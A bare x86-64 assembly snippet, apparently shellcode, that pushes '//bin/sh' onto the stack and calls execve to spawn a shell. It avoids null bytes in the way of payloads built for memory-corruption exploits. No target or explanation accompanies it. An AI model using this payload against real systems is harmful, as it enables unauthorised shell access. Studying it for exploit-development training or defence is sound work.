.global _start
_start:
  .intel_syntax noprefix

  xor rax, rax
  push rax

  mov r10, 0x68732f6e69622f2f
  push r10

  mov rdi, rsp

  xor rsi, rsi
  xor rdx, rdx

  mov al, 0x3b

  syscall

  ret
